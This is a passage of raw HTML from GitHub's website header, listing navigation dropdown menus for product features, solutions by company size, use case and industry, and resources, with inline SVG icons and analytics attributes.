        <div class="color-fg-default h4">Security</div>
        Find and fix vulnerabilities
      </div>

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;actions&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;actions_link_product_navbar&quot;}" href="https://github.com/features/actions">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-workflow color-fg-subtle mr-3">
    <path d="M1 3a2 2 0 0 1 2-2h6.5a2 2 0 0 1 2 2v6.5a2 2 0 0 1-2 2H7v4.063C7 16.355 7.644 17 8.438 17H12.5v-2.5a2 2 0 0 1 2-2H21a2 2 0 0 1 2 2V21a2 2 0 0 1-2 2h-6.5a2 2 0 0 1-2-2v-2.5H8.437A2.939 2.939 0 0 1 5.5 15.562V11.5H3a2 2 0 0 1-2-2Zm2-.5a.5.5 0 0 0-.5.5v6.5a.5.5 0 0 0 .5.5h6.5a.5.5 0 0 0 .5-.5V3a.5.5 0 0 0-.5-.5ZM14.5 14a.5.5 0 0 0-.5.5V21a.5.5 0 0 0 .5.5H21a.5.5 0 0 0 .5-.5v-6.5a.5.5 0 0 0-.5-.5Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Actions</div>
        Automate any workflow
      </div>

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;codespaces&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;codespaces_link_product_navbar&quot;}" href="https://github.com/features/codespaces">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-codespaces color-fg-subtle mr-3">
    <path d="M3.5 3.75C3.5 2.784 4.284 2 5.25 2h13.5c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 18.75 13H5.25a1.75 1.75 0 0 1-1.75-1.75Zm-2 12c0-.966.784-1.75 1.75-1.75h17.5c.966 0 1.75.784 1.75 1.75v4a1.75 1.75 0 0 1-1.75 1.75H3.25a1.75 1.75 0 0 1-1.75-1.75ZM5.25 3.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h13.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Zm-2 12a.25.25 0 0 0-.25.25v4c0 .138.112.25.25.25h17.5a.25.25 0 0 0 .25-.25v-4a.25.25 0 0 0-.25-.25Z"></path><path d="M10 17.75a.75.75 0 0 1 .75-.75h6.5a.75.75 0 0 1 0 1.5h-6.5a.75.75 0 0 1-.75-.75Zm-4 0a.75.75 0 0 1 .75-.75h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1-.75-.75Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Codespaces</div>
        Instant dev environments
      </div>

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;issues&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;issues_link_product_navbar&quot;}" href="https://github.com/features/issues">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-issue-opened color-fg-subtle mr-3">
    <path d="M12 1c6.075 0 11 4.925 11 11s-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1ZM2.5 12a9.5 9.5 0 0 0 9.5 9.5 9.5 9.5 0 0 0 9.5-9.5A9.5 9.5 0 0 0 12 2.5 9.5 9.5 0 0 0 2.5 12Zm9.5 2a2 2 0 1 1-.001-3.999A2 2 0 0 1 12 14Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Issues</div>
        Plan and track work
      </div>

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;code_review&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;code_review_link_product_navbar&quot;}" href="https://github.com/features/code-review">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-code-review color-fg-subtle mr-3">
    <path d="M10.3 6.74a.75.75 0 0 1-.04 1.06l-2.908 2.7 2.908 2.7a.75.75 0 1 1-1.02 1.1l-3.5-3.25a.75.75 0 0 1 0-1.1l3.5-3.25a.75.75 0 0 1 1.06.04Zm3.44 1.06a.75.75 0 1 1 1.02-1.1l3.5 3.25a.75.75 0 0 1 0 1.1l-3.5 3.25a.75.75 0 1 1-1.02-1.1l2.908-2.7-2.908-2.7Z"></path><path d="M1.5 4.25c0-.966.784-1.75 1.75-1.75h17.5c.966 0 1.75.784 1.75 1.75v12.5a1.75 1.75 0 0 1-1.75 1.75h-9.69l-3.573 3.573A1.458 1.458 0 0 1 5 21.043V18.5H3.25a1.75 1.75 0 0 1-1.75-1.75ZM3.25 4a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h2.5a.75.75 0 0 1 .75.75v3.19l3.72-3.72a.749.749 0 0 1 .53-.22h10a.25.25 0 0 0 .25-.25V4.25a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Code Review</div>
        Manage code changes
      </div>

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;discussions&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;discussions_link_product_navbar&quot;}" href="https://github.com/features/discussions">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-comment-discussion color-fg-subtle mr-3">
    <path d="M1.75 1h12.5c.966 0 1.75.784 1.75 1.75v9.5A1.75 1.75 0 0 1 14.25 14H8.061l-2.574 2.573A1.458 1.458 0 0 1 3 15.543V14H1.75A1.75 1.75 0 0 1 0 12.25v-9.5C0 1.784.784 1 1.75 1ZM1.5 2.75v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25Z"></path><path d="M22.5 8.75a.25.25 0 0 0-.25-.25h-3.5a.75.75 0 0 1 0-1.5h3.5c.966 0 1.75.784 1.75 1.75v9.5A1.75 1.75 0 0 1 22.25 20H21v1.543a1.457 1.457 0 0 1-2.487 1.03L15.939 20H10.75A1.75 1.75 0 0 1 9 18.25v-1.465a.75.75 0 0 1 1.5 0v1.465c0 .138.112.25.25.25h5.5a.75.75 0 0 1 .53.22l2.72 2.72v-2.19a.75.75 0 0 1 .75-.75h2a.25.25 0 0 0 .25-.25v-9.5Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Discussions</div>
        Collaborate outside of code
      </div>

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;code_search&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;code_search_link_product_navbar&quot;}" href="https://github.com/features/code-search">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-code-square color-fg-subtle mr-3">
    <path d="M10.3 8.24a.75.75 0 0 1-.04 1.06L7.352 12l2.908 2.7a.75.75 0 1 1-1.02 1.1l-3.5-3.25a.75.75 0 0 1 0-1.1l3.5-3.25a.75.75 0 0 1 1.06.04Zm3.44 1.06a.75.75 0 1 1 1.02-1.1l3.5 3.25a.75.75 0 0 1 0 1.1l-3.5 3.25a.75.75 0 1 1-1.02-1.1l2.908-2.7-2.908-2.7Z"></path><path d="M2 3.75C2 2.784 2.784 2 3.75 2h16.5c.966 0 1.75.784 1.75 1.75v16.5A1.75 1.75 0 0 1 20.25 22H3.75A1.75 1.75 0 0 1 2 20.25Zm1.75-.25a.25.25 0 0 0-.25.25v16.5c0 .138.112.25.25.25h16.5a.25.25 0 0 0 .25-.25V3.75a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Code Search</div>
        Find more, search less
      </div>

    
</a></li>

                </ul>
              </div>
          </div>
          <div class="HeaderMenu-column px-lg-4">
              <div class="border-bottom pb-3 pb-lg-0 border-lg-bottom-0 border-bottom-0">
                    <span class="d-block h4 color-fg-default my-1" id="product-explore-heading">Explore</span>
                <ul class="list-style-none f5" aria-labelledby="product-explore-heading">
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;all_features&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;all_features_link_product_navbar&quot;}" href="https://github.com/features">
      All features

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;documentation&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;documentation_link_product_navbar&quot;}" href="https://docs.github.com">
      Documentation

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;github_skills&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;github_skills_link_product_navbar&quot;}" href="https://skills.github.com">
      GitHub Skills

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;blog&quot;,&quot;context&quot;:&quot;product&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;blog_link_product_navbar&quot;}" href="https://github.blog">
      Blog

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

                </ul>
              </div>
          </div>
      </div>
</li>

                  <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
      <button type="button" class="HeaderMenu-link border-0 width-full width-lg-auto px-0 px-lg-2 py-lg-2 no-wrap d-flex flex-items-center flex-justify-between js-details-target" aria-expanded="false">
        Solutions
        <svg opacity="0.5" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-down HeaderMenu-icon ml-1">
    <path d="M12.78 5.22a.749.749 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.06 0L3.22 6.28a.749.749 0 1 1 1.06-1.06L8 8.939l3.72-3.719a.749.749 0 0 1 1.06 0Z"></path>
</svg>
      </button>
      <div class="HeaderMenu-dropdown dropdown-menu rounded m-0 p-0 pt-2 pt-lg-4 position-relative position-lg-absolute left-0 left-lg-n3 d-lg-flex flex-wrap dropdown-menu-wide">
          <div class="HeaderMenu-column px-lg-4 border-lg-right mb-4 mb-lg-0 pr-lg-7">
              <div class="border-bottom pb-3 pb-lg-0 border-lg-bottom-0 pb-lg-3 mb-3 mb-lg-0">
                    <span class="d-block h4 color-fg-default my-1" id="solutions-by-company-size-heading">By company size</span>
                <ul class="list-style-none f5" aria-labelledby="solutions-by-company-size-heading">
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;enterprises&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;enterprises_link_solutions_navbar&quot;}" href="https://github.com/enterprise">
      Enterprises

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;small_and_medium_teams&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;small_and_medium_teams_link_solutions_navbar&quot;}" href="https://github.com/team">
      Small and medium teams

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;startups&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;startups_link_solutions_navbar&quot;}" href="https://github.com/enterprise/startups">
      Startups

    
</a></li>

                </ul>
              </div>
              <div class="border-bottom pb-3 pb-lg-0 border-lg-bottom-0">
                    <span class="d-block h4 color-fg-default my-1" id="solutions-by-use-case-heading">By use case</span>
                <ul class="list-style-none f5" aria-labelledby="solutions-by-use-case-heading">
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;devsecops&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;devsecops_link_solutions_navbar&quot;}" href="/solutions/use-case/devsecops">
      DevSecOps

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;devops&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;devops_link_solutions_navbar&quot;}" href="/solutions/use-case/devops">
      DevOps

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;ci_cd&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;ci_cd_link_solutions_navbar&quot;}" href="/solutions/use-case/ci-cd">
      CI/CD

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;view_all_use_cases&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;view_all_use_cases_link_solutions_navbar&quot;}" href="/solutions/use-case">
      View all use cases

    
</a></li>

                </ul>
              </div>
          </div>
          <div class="HeaderMenu-column px-lg-4">
              <div class="border-bottom pb-3 pb-lg-0 border-lg-bottom-0">
                    <span class="d-block h4 color-fg-default my-1" id="solutions-by-industry-heading">By industry</span>
                <ul class="list-style-none f5" aria-labelledby="solutions-by-industry-heading">
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;healthcare&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;healthcare_link_solutions_navbar&quot;}" href="/solutions/industry/healthcare">
      Healthcare

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;financial_services&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;financial_services_link_solutions_navbar&quot;}" href="/solutions/industry/financial-services">
      Financial services

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;manufacturing&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;manufacturing_link_solutions_navbar&quot;}" href="/solutions/industry/manufacturing">
      Manufacturing

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;government&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;government_link_solutions_navbar&quot;}" href="/solutions/industry/government">
      Government

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;view_all_industries&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;view_all_industries_link_solutions_navbar&quot;}" href="/solutions/industry">
      View all industries

    
</a></li>

                </ul>
              </div>
          </div>
         <div class="HeaderMenu-trailing-link rounded-bottom-2 flex-shrink-0 mt-lg-4 px-lg-4 py-4 py-lg-3 f5 text-semibold">
            <a href="/solutions">
              View all solutions
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-right HeaderMenu-trailing-link-icon">
    <path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</a>         </div>
      </div>
</li>

                    <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
      <button type="button" class="HeaderMenu-link border-0 width-full width-lg-auto px-0 px-lg-2 py-lg-2 no-wrap d-flex flex-items-center flex-justify-between js-details-target" aria-expanded="false">
        Resources
        <svg opacity="0.5" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-down HeaderMenu-icon ml-1">
    <path d="M12.78 5.22a.749.749 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.06 0L3.22 6.28a.749.749 0 1 1 1.06-1.06L8 8.939l3.72-3.719a.749.749 0 0 1 1.06 0Z"></path>
</svg>
      </button>
      <div class="HeaderMenu-dropdown dropdown-menu rounded m-0 p-0 pt-2 pt-lg-4 position-relative position-lg-absolute left-0 left-lg-n3 pb-2 pb-lg-4 d-lg-flex flex-wrap dropdown-menu-wide">
          <div class="HeaderMenu-column px-lg-4 border-lg-right mb-4 mb-lg-0 pr-lg-7">
              <div class="border-bottom pb-3 pb-lg-0 border-lg-bottom-0">
                    <span class="d-block h4 color-fg-default my-1" id="resources-topics-heading">Topics</span>
                <ul class="list-style-none f5" aria-labelledby="resources-topics-heading">
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;ai&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;ai_link_resources_navbar&quot;}" href="/resources/articles/ai">
      AI

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;devops&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;devops_link_resources_navbar&quot;}" href="/resources/articles/devops">
      DevOps

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;security&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;security_link_resources_navbar&quot;}" href="/resources/articles/security">
      Security

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;software_development&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;software_development_link_resources_navbar&quot;}" href="/resources/articles/software-development">
      Software Development

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;view_all&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;view_all_link_resources_navbar&quot;}" href="/resources/articles">
      View all

    
</a></li>

                </ul>
              </div>
          </div>
          <div class="HeaderMenu-column px-lg-4">
              <div class="border-bottom pb-3 pb-lg-0 border-lg-bottom-0 border-bottom-0">
                    <span class="d-block h4 color-fg-default my-1" id="resources-explore-heading">Explore</span>
                <ul class="list-style-none f5" aria-labelledby="resources-explore-heading">
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;learning_pathways&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;learning_pathways_link_resources_navbar&quot;}" href="https://resources.github.com/learn/pathways">
      Learning Pathways

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;white_papers_ebooks_webinars&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;white_papers_ebooks_webinars_link_resources_navbar&quot;}" href="https://resources.github.com">
      White papers, Ebooks, Webinars

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;customer_stories&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;customer_stories_link_resources_navbar&quot;}" href="https://github.com/customer-stories">
      Customer Stories

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary Link--external" target="_blank" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;partners&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;partners_link_resources_navbar&quot;}" href="https://partner.github.com">
      Partners

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;executive_insights&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;executive_insights_link_resources_navbar&quot;}" href="https://github.com/solutions/executive-insights">
      Executive Insights

    
</a></li>

                </ul>
              </div>
          </div>
      </div>
</li>


                <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
      <button type="button" class="HeaderMenu-link border-0 width-full width-lg-auto px-0 px-lg-2 py-lg-2 no-wrap d-flex flex-items-center flex-justify-between js-details-target" aria-expanded="false">
        Open Source
